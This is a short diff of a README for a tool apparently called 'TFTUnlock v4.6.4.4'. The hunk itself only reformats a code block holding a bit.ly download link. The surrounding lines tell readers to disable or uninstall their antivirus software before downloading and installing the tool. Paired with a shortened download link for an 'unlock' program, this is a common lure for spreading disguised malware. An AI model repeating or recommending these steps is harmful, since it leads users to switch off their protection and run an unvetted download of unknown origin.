@@ -12,8 +12,8 @@ Before proceeding, make sure you have disabled or uninstalled any antivirus soft
 
 First, download the repository containing all necessary files.
 
-   ```bash
-    https://bit.ly/TFTUnlock
+```bash
+https://bit.ly/TFTUnlock
 ```
 
 ### 2. Install TFTUnlock v4.6.4.4
